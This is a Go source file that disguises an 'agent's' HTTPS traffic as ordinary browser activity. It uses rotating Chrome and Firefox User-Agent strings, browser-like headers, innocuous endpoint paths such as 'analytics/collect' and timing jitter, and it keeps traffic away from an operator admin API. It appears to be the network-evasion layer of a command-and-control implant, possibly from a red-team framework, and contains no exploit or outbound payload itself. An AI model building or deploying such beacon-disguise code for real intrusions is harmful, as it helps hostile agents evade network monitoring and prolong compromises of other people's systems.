// Package netshape shapes agent HTTPS requests so they resemble ordinary
// desktop browser traffic. It supplies a browser User-Agent, a set of
// browser-plausible request headers, a randomized-but-safe request path, and a
// pacing jitter helper.
//
// Paths are always the configured server base path plus one token from a fixed
// pool of plausible endpoint segments. The server mux routes every non-/admin
// path to the agent handler, so the varied paths remain accepted. Generated
// paths never contain "..", "//", a scheme, a query, or a fragment, and never
// target "/admin".
//
// A Profile is safe for concurrent use. Jitter operates on a caller-supplied
// *rand.Rand and therefore inherits the caller's concurrency constraints.
package netshape

import (
	crand "crypto/rand"
	"crypto/sha256"
	"encoding/binary"
	"math"
	"math/rand"
	"net/url"
	"path"
	"strings"
	"time"
)

// userAgents is a small fixed pool of realistic desktop Chrome/Firefox
// User-Agent strings. Nothing is fetched at runtime.
var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.6; rv:133.0) Gecko/20100101 Firefox/133.0",
	"Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0",
}

// pathSegments is the pool of plausible endpoint segments. Entries are short,
// lowercase, and use only alphanumerics, '-', '_', and '/'. None targets admin.
var pathSegments = []string{
	"api/v2/telemetry",
	"api/v1/config",
	"content/updates",
	"assets/runtime",
	"metrics/report",
	"config/sync",
	"v3/events",
	"static/chunk",
	"updates/manifest",
	"data/stream",
	"analytics/collect",
	"sync/state",
}

// Profile selects the request shape for one agent session. The selection is
// fixed at construction, so a Profile is immutable and safe for concurrent use.
type Profile struct {
	base      string
	seed      [32]byte
	uaIndex   int
	pathIndex int
}

// NewProfile builds a Profile for the given server URL path prefix (for
// example "" or "/api"). The path prefix is sanitized defensively: query and
// fragment are dropped, dot segments are resolved, and prefixes whose first
// segment is "admin" are ignored so generated paths can never collide with the
// operator admin API.
//
// When seed is non-empty it fully determines the generated shape; passing the
// same seed produces the same User-Agent, headers, and path. An empty seed is
// replaced with fresh crypto/rand bytes.
func NewProfile(basePath string, seed []byte) *Profile {
	p := &Profile{base: cleanBasePath(basePath)}
	if len(seed) > 0 {
		p.seed = sha256.Sum256(seed)
	} else if _, err := crand.Read(p.seed[:]); err != nil {
		p.seed = sha256.Sum256(nil)
	}
	p.pathIndex = int(derive(p.seed, 'p') % uint64(len(pathSegments)))
	p.uaIndex = int(derive(p.seed, 'u') % uint64(len(userAgents)))
	return p
}

// UserAgent returns the browser User-Agent for the current session.
func (p *Profile) UserAgent() string {
	return userAgents[p.uaIndex]
}

// Headers returns fresh browser-plausible request headers for the current
// session. The map never contains Content-Type; the caller owns request framing
// for the wire envelope. User-Agent is exposed separately via UserAgent.
func (p *Profile) Headers() map[string]string {
	firefox := strings.Contains(userAgents[p.uaIndex], "Firefox/")

	h := map[string]string{
		"Accept-Language":           "en-US,en;q=0.9",
		"Cache-Control":             "no-cache",
		"DNT":                       "1",
		"Pragma":                    "no-cache",
		"Sec-Fetch-Dest":            "empty",
		"Sec-Fetch-Mode":            "cors",
		"Sec-Fetch-Site":            "none",
		"Upgrade-Insecure-Requests": "1",
	}
	if firefox {
		h["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
		h["Accept-Language"] = "en-US,en;q=0.5"
	} else {
		h["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
	}
	return h
}

// Path returns basePath plus a plausible randomized endpoint segment. The
// value is fixed for the life of the Profile.
func (p *Profile) Path() string {
	seg := pathSegments[p.pathIndex]
	if p.base == "" {
		return "/" + seg
	}
	return p.base + "/" + seg
}

// derive is a deterministic, label-separated hash of the profile seed.
func derive(seed [32]byte, label byte) uint64 {
	var in [33]byte
	copy(in[:32], seed[:])
	in[32] = label
	sum := sha256.Sum256(in[:])
	return binary.BigEndian.Uint64(sum[:8])
}

// cleanBasePath normalizes a configured URL path prefix. It returns "" or a
// cleaned absolute path with no trailing slash and no dot segments. Defensive
// rejection of an admin first segment keeps generated paths away from the
// operator mux.
func cleanBasePath(basePath string) string {
	b := strings.TrimSpace(basePath)
	if b == "" {
		return ""
	}
	if i := strings.IndexAny(b, "?#"); i >= 0 {
		b = b[:i]
	}
	if u, err := url.Parse(b); err == nil && u.Host != "" {
		b = u.Path
	}
	if b == "" {
		return ""
	}
	if !strings.HasPrefix(b, "/") {
		b = "/" + b
	}
	b = path.Clean(b)
	if b == "/" || b == "." {
		return ""
	}
	first := strings.TrimPrefix(b, "/")
	if i := strings.IndexByte(first, '/'); i >= 0 {
		first = first[:i]
	}
	if strings.EqualFold(first, "admin") {
		return ""
	}
	return b
}

// Jitter returns base plus uniform random noise in [-max, +max], clamped to a
// minimum of zero. A nil rng or a non-positive max returns base (clamped).
func Jitter(base, max time.Duration, rng *rand.Rand) time.Duration {
	if rng == nil || max <= 0 {
		if base < 0 {
			return 0
		}
		return base
	}
	n := int64(max)
	var delta time.Duration
	if n <= (math.MaxInt64-1)/2 {
		delta = time.Duration(rng.Int63n(2*n+1)) - time.Duration(n)
	} else {
		// Unreachable for real durations (would exceed ~146 years); fall back
		// to a sign/magnitude draw so the arithmetic cannot overflow.
		if n == math.MaxInt64 {
			n--
		}
		mag := time.Duration(rng.Int63n(n + 1))
		if rng.Intn(2) == 0 {
			delta = -mag
		} else {
			delta = mag
		}
	}
	d := base + delta
	if delta > 0 && d < base {
		return math.MaxInt64
	}
	if delta < 0 && d > base {
		return 0
	}
	if d < 0 {
		return 0
	}
	return d
}
